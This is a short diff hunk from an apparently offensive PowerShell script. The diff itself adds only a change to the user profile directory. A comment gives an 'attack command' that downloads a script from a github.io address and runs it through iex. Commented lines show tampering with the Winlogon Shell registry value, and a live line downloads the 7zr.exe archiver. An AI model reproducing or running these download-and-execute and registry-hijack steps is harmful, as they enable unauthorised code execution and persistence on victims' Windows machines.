@@ -3,6 +3,7 @@
 # Attack command: powershell -c iwr https://bfffggh.github.io/bp1|iex<br>
 
 Add-Type -Assembly System.Windows.Forms
+cd $env:userprofile
 # Start-Process reg.exe -Argument 'add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d explorer.exe /f'
 # Start-Process userinit.exe
 iwr -uri 7-zip.org/a/7zr.exe -outfile .\7zr.exe
